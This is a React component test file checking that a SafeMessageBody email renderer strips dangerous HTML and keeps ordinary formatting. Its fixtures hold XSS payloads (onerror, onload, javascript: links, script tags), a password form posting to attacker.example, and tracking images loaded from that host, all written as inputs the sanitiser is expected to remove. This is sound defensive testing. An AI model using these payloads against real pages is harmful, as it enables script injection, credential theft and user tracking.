import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';

import { SafeMessageBody } from './SafeMessageBody';

describe('SafeMessageBody', () => {
    it('removes executable HTML while preserving safe content', () => {
        const { container } = render(
            <SafeMessageBody
                bodyHtml={`
                    <p>Hello <strong>support</strong></p>
                    <img src="x" onerror="window.__queuefixXss = true">
                    <svg><g onload="window.__queuefixXss = true"></g></svg>
                    <a href="javascript:window.__queuefixXss = true">unsafe link</a>
                    <script>window.__queuefixXss = true</script>
                `}
            />,
        );

        expect(container.querySelector('strong')).toHaveTextContent('support');
        expect(container.querySelector('script')).not.toBeInTheDocument();
        expect(container.querySelector('svg')).not.toBeInTheDocument();
        expect(container.querySelector('img')).not.toHaveAttribute('onerror');
        expect(container.querySelector('a')).not.toHaveAttribute('href');
    });

    it('renders plain-text markup literally', () => {
        const payload = '<img src="x" onerror="window.__queuefixXss = true">';
        const { container } = render(<SafeMessageBody bodyText={payload} />);

        expect(container).toHaveTextContent(payload);
        expect(container.querySelector('img')).not.toBeInTheDocument();
    });

    it('renders hostile stored HTML as inert email content', () => {
        const { container } = render(
            <SafeMessageBody
                bodyHtml={`
                    <form action="https://attacker.example/collect">
                        <input name="password">
                        <button>Sign in</button>
                    </form>
                    <img data-kind="remote" src="https://attacker.example/open.gif">
                    <img data-kind="protocol-relative" src="//attacker.example/open.gif">
                    <img data-kind="responsive" src="cid:safe@example.com" srcset="https://attacker.example/large.png 2x">
                    <video poster="https://attacker.example/poster.png"><source src="https://attacker.example/movie.mp4"></video>
                    <p id="overlay" class="fixed inset-0" style="position: fixed; inset: 0; background-image: url(https://attacker.example/background.png)">Overlay</p>
                `}
            />,
        );

        expect(container.querySelector('form')).not.toBeInTheDocument();
        expect(container.querySelector('input')).not.toBeInTheDocument();
        expect(container.querySelector('button')).not.toBeInTheDocument();
        expect(container.querySelector('video')).not.toBeInTheDocument();
        expect(container.querySelector('source')).not.toBeInTheDocument();
        const images = container.querySelectorAll('img');
        expect(images).toHaveLength(3);
        expect(images[0]).not.toHaveAttribute('src');
        expect(images[1]).not.toHaveAttribute('src');
        expect(images[2]).toHaveAttribute('src', 'cid:safe@example.com');
        expect(images[2]).not.toHaveAttribute('srcset');
        expect(container.querySelector('#overlay')).not.toBeInTheDocument();
        expect(container).toHaveTextContent('Overlay');
        expect(container.innerHTML).not.toContain('attacker.example');
    });

    it('preserves representative email formatting and inert resource URLs', () => {
        const { container } = render(
            <SafeMessageBody
                bodyHtml={`
                    <p style="color: red"><em>Formatted message</em></p>
                    <table><tbody><tr><td>Cell</td></tr></tbody></table>
                    <a href="https://example.com/help">Help</a>
                    <img src="cid:logo@example.com" alt="Company logo">
                    <img src="data:image/png;base64,iVBORw0KGgo=" alt="Embedded chart">
                `}
            />,
        );

        expect(container.querySelector('p')).not.toHaveAttribute('style');
        expect(container.querySelector('em')).toHaveTextContent('Formatted message');
        expect(container.querySelector('td')).toHaveTextContent('Cell');
        expect(container.querySelector('a')).toHaveAttribute('href', 'https://example.com/help');
        expect(container.querySelector('a')).toHaveAttribute('rel', 'nofollow noopener noreferrer');
        expect(container.querySelector('a')).toHaveAttribute('target', '_blank');
        expect(container.querySelectorAll('img')[0]).toHaveAttribute('src', 'cid:logo@example.com');
        expect(container.querySelectorAll('img')[1]).toHaveAttribute('src', 'data:image/png;base64,iVBORw0KGgo=');
    });
});
